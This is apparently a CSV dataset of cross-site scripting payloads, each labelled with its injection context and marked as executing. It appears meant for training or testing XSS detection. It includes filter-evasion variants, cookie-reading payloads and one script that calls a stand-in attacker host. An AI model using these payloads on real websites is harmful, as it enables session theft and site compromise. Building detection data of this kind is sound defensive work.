payload,context,exec
"<script>alert(1)</script>	",html_tag,1
"<script>confirm(1)</script>		",html_tag,1
"<script>prompt(1)</script>		",html_tag,1
"<script>alert(document.cookie)</script>		",html_tag,1
"<script>fetch('http://attacker.com')</script>	",html_tag,1
"<img src=x onerror=alert(1)>		",html_tag,1
"<body onload=alert(1)>	",html_tag,1
,,
"<input onfocus=alert(1) autofocus>	",html_tag,1
"<details open ontoggle=alert(1)>		",html_tag,1
"<ScRiPt>alert(1)</ScRiPt>	",html_tag,1
<script>alert(String.fromCharCode(49))</script>,html_tag,1
"<script>\u0061lert(1)</script>	",html_tag,1
""" onmouseover=alert(1)",html_attribute,1
,,
,,
"""><script>alert(1)</script>",html_attribute,1
<svg/onload=alert(1)>,html_tag,1
,,
javascript:alert(1),url_href,1
"data:text/html,<script>alert(1)</script>",url_navigation,1
'><svg/onload=alert(1)>,html_attribute,1
"""><img src=x onerror=confirm(1)>",html_attribute,1
</script><script>alert(1)</script>,script_block,1
<script>alert(document.domain)</script>,html_tag,1
,,
,,
,,
,,
,,
,,
%3Cscript%3Ealert(1)%3C%2Fscript%3E,html_tag,1
"<scr<script>ipt>alert(1)</scr</script>ipt>		",html_tag,1
<script>alert`1`</script>,html_tag,1
<script>window.alert(1)</script>,html_tag,1
<script>top.alert(1)</script>,html_tag,1
<script>this.alert(1)</script>,html_tag,1
<img src=x onerror=confirm(1)>,html_tag,1
<img src=x onerror=prompt(1)>,html_tag,1
<img src=1 onerror=alert(1)>,html_tag,1
<img src=a onerror=alert(document.cookie)>,html_tag,1
<img src=x onerror=alert('XSS')>,html_tag,1
<img src=x onerror=alert(window.origin)>,html_tag,1
<img src=x onerror=alert(location)>,html_tag,1
<img src=x onerror=alert(navigator.userAgent)>,html_tag,1
<img src=x onerror=alert(document.URL)>,html_tag,1
<svg onload=prompt(1)>,html_tag,1
<svg><script>alert(1)</script>,html_tag,1
<svg><script>alert(document.domain)</script>,html_tag,1
<svg><script>confirm(1)</script>,html_tag,1
<svg><script>prompt(1)</script>,html_tag,1
<svg onload=alert(document.cookie)>,html_tag,1
<svg onload=alert(location)>,html_tag,1
,,
""" onmouseover=alert(1) """,html_attribute,1
""" onclick=alert(1)",html_attribute,1
""" onclick=alert(1) """,html_attribute,1
,,
""" onmouseenter=alert(1) """,html_attribute,1
onmouseover=alert(1),html_attribute,1
""" onmouseleave=alert(1) """,html_attribute,1
,,
""" onkeyup=alert(1) """,html_attribute,1
,,
""" onkeydown=alert(1) """,html_attribute,1
,,
""" oninput=alert(1) """,html_attribute,1
,,
""" onblur=alert(1) """,html_attribute,1
,,
,,
,,
""" onfocus=alert(1) autofocus """,html_attribute,1
,,
,,
,,
""";confirm(1);//",script_block,1
,,
""";prompt(1);//",script_block,1
,,
""";alert(document.domain);//",script_block,1
,,
""";alert(document.cookie);//",script_block,1
,,
""";alert(location);//",script_block,1
,,
""";alert(window.origin);//",script_block,1
,,
""";alert(navigator.userAgent);//",script_block,1
,,
""";alert(document.title);//",script_block,1
,,
""";alert(history.length);//",script_block,1
,,
javascript:alert(1),url_href,1
,,
javascript:confirm(1),url_href,1
,,
javascript:prompt(1),url_href,1
,,
javascript:alert(document.domain),url_href,1
,,
javascript:alert(document.cookie),url_href,1
,,
javascript:alert(location),url_href,1
,,
javascript:alert(window.origin),url_href,1
